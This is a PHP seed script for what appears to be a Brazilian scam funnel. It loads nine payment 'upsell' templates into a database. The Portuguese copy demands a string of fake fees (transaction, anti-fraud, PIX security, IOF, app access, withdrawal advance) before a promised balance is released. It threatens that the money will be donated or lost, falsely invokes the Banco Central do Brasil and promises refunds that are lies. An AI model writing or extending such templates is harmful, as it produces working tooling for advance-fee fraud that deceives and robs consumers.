<?php
// Seed idempotente dos upsells oficiais do funil.
// Executa uma única vez por versão (controlada em site_config.upsell_seed_version).

if (!function_exists('ensureUpsellSeed')) {
function ensureUpsellSeed(PDO $pdo) {
    $TARGET_VERSION = '10';
    try {
        $current = getConfigValue('upsell_seed_version', '0');
        if ($current === $TARGET_VERSION) return;

        // Remove os upsells legados (Jadlog / Pendência antigos)
        $pdo->exec("DELETE FROM upsell_templates WHERE template_key IN ('jadlog','pendencia','havan','simple')");

        $upsells = [
            [
                'slug' => 'taxa-transacao',
                'template_key' => 'taxa_saque',
                'title' => 'Taxa de transação bancária',
                'logo_url' => '',
                'status_ok_label' => 'Parabéns',
                'status_warn_label' => 'ATENÇÃO: CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!',
                'description' => 'Seu saque está quase garantido! Temos uma taxa de transação bancária obrigatória para realizar o saque.',
                'problem_title' => 'Para receber o seu saque total imediatamente',
                'problem_description' => 'é necessário que pague apenas a taxa de transferência, porque temos custos para fazer essa transação.',
                'button_label' => 'PAGAR A TAXA E RECEBER IMEDIATAMENTE',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 2991,
                'active' => 1,
                'sort_order' => 1,
            ],
            [
                'slug' => 'antecipacao-prioritaria',
                'template_key' => 'antecipacao',
                'title' => 'Antecipação Prioritária',
                'logo_url' => '',
                'status_ok_label' => 'SAQUE SOLICITADO!',
                'status_warn_label' => 'O valor será creditado no prazo de até 180 dias. Recomendamos a antecipação para evitar a possibilidade de perda da vaga!',
                'description' => 'Prazo de processamento bancário: 180 dias.',
                'problem_title' => 'Vaga de Antecipação Prioritária Disponível',
                'problem_description' => 'EXCLUSIVO: Antecipe seu saque agora e receba direto no seu PIX hoje!',
                'button_label' => 'ANTECIPAR E RECEBER TUDO',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 2790,
                'active' => 1,
                'sort_order' => 2,
            ],
            [
                'slug' => 'cashback-taxas',
                'template_key' => 'cashback',
                'title' => 'Tarifa CASHBACK',
                'logo_url' => '',
                'status_ok_label' => 'RECEBA SAQUE E TAXAS DE VOLTA',
                'status_warn_label' => 'Última etapa para liberar o seu PIX com todas as taxas devolvidas.',
                'description' => 'Veja abaixo os valores pagos em taxa:',
                'problem_title' => 'Receba saque e taxas de volta',
                'problem_description' => 'Para receber seu saque e as taxas de volta é necessário efetuar o pagamento da tarifa CASHBACK.',
                'button_label' => 'RECEBER SAQUE E TAXAS DE VOLTA!',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 3291,
                'active' => 1,
                'sort_order' => 3,
            ],
            [
                'slug' => 'taxa-anti-fraude',
                'template_key' => 'antifraude',
                'title' => 'Taxa Anti Fraude',
                'logo_url' => '',
                'status_ok_label' => 'Ação Urgente Necessária',
                'status_warn_label' => 'Atenção: seu saldo está retido!',
                'description' => 'Para liberar seu saldo é necessário efetuar o pagamento da taxa Anti Fraude.',
                'problem_title' => 'Aviso importante',
                'problem_description' => 'O não pagamento da taxa resultará na perda total do saldo acumulado.',
                'button_label' => 'Pagar e liberar saldo',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 2871,
                'active' => 1,
                'sort_order' => 4,
            ],
            [
                'slug' => 'acesso-aplicativo',
                'template_key' => 'acesso_app',
                'title' => 'Taxa anual de acesso ao app',
                'logo_url' => '',
                'status_ok_label' => 'Acesso Negado!',
                'status_warn_label' => 'ATENÇÃO: se você não sacar o dinheiro agora, ele será doado!',
                'description' => 'Você está a 94% de acessar o aplicativo.',
                'problem_title' => 'Importante',
                'problem_description' => 'Se não pagar hoje, você perderá sua vaga permanentemente.',
                'button_label' => 'Pagar a taxa e acessar o app',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 2790,
                'active' => 1,
                'sort_order' => 5,
            ],
            [
                'slug' => 'taxa-seguranca-pix',
                'template_key' => 'pix_cadastrado',
                'title' => 'Taxa de segurança da transferência',
                'logo_url' => '',
                'status_ok_label' => 'PIX CADASTRADO',
                'status_warn_label' => 'ATENÇÃO: CASO NÃO TRANSFIRA O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E VOCÊ PERDERÁ 100% DO VALOR!',
                'description' => 'Seu PIX foi cadastrado e aprovado para receber o saque.',
                'problem_title' => 'Taxa de segurança',
                'problem_description' => 'Por motivos de segurança é necessário pagar uma pequena taxa para realizarmos a transferência.',
                'button_label' => 'LIBERAR SAQUE',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 3349,
                'active' => 1,
                'sort_order' => 6,
            ],
            [
                'slug' => 'taxa-manutencao-app',
                'template_key' => 'manutencao_app',
                'title' => 'Taxa de manutenção do aplicativo',
                'logo_url' => '',
                'status_ok_label' => 'Parabéns',
                'status_warn_label' => 'ATENÇÃO: CASO NÃO SAQUE O DINHEIRO DE IMEDIATO, ELE SERÁ ENVIADO PARA UM FUNDO DE DOAÇÃO E PERDERÁ 100% DO SALDO!',
                'description' => 'Sua vaga está garantida! Falta apenas a taxa de manutenção para acessar o aplicativo.',
                'problem_title' => 'Taxa de manutenção',
                'problem_description' => 'Após pagar, o link para download será enviado automaticamente pelo WhatsApp e E-mail.',
                'button_label' => 'PAGAR A TAXA E ACESSAR O APP',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 2781,
                'active' => 1,
                'sort_order' => 7,
            ],
            [
                'slug' => 'taxa-iof',
                'template_key' => 'taxa_iof',
                'title' => 'Taxa IOF',
                'logo_url' => '',
                'status_ok_label' => 'Pagamento enviado com sucesso!',
                'status_warn_label' => 'Transferência interrompida pelo Banco Central do Brasil',
                'description' => 'Seu saldo foi enviado, mas a transferência foi interrompida pelo Banco Central do Brasil.',
                'problem_title' => 'Taxa IOF',
                'problem_description' => 'Valor simbólico para validação e segurança, estornado em até 2 min após o pagamento.',
                'button_label' => 'PAGAR TAXA IOF E DESBLOQUEAR MEU SALDO',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 2990,
                'active' => 1,
                'sort_order' => 8,
            ],
            [
                'slug' => 'antecipacao-saque',
                'template_key' => 'antecipacao_saque',
                'title' => 'Taxa de antecipação de saque',
                'logo_url' => '',
                'status_ok_label' => 'PARABÉNS',
                'status_warn_label' => 'Caso não consiga pagar a taxa hoje, você perderá a sua vaga. NÃO REEMBOLSÁVEL',
                'description' => 'Seu saque está sendo processado e será creditado em até 15 dias.',
                'problem_title' => 'Taxa de antecipação',
                'problem_description' => 'Adiante seu saque e receba em menos de 5 minutos na sua chave PIX.',
                'button_label' => 'PAGAR A TAXA DE ANTECIPAÇÃO',
                'pay_button_label' => 'Pagar agora',
                'amount_cents' => 2998,
                'active' => 1,
                'sort_order' => 9,
            ],
        ];

        $sel = $pdo->prepare("SELECT id FROM upsell_templates WHERE slug = ? LIMIT 1");
        $ins = $pdo->prepare("INSERT INTO upsell_templates (slug, template_key, title, logo_url, status_ok_label, status_warn_label, description, problem_title, problem_description, button_label, pay_button_label, amount_cents, active, sort_order) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)");

        foreach ($upsells as $u) {
            $sel->execute([$u['slug']]);
            if ($sel->fetch(PDO::FETCH_ASSOC)) continue;
            $ins->execute([
                $u['slug'], $u['template_key'], $u['title'], $u['logo_url'],
                $u['status_ok_label'], $u['status_warn_label'], $u['description'],
                $u['problem_title'], $u['problem_description'], $u['button_label'],
                $u['pay_button_label'], $u['amount_cents'], $u['active'], $u['sort_order'],
            ]);
        }

        setConfigValue('upsell_seed_version', $TARGET_VERSION);
    } catch (Exception $e) {
        // silencioso — nunca quebrar a listagem por causa do seed
    }
}
}
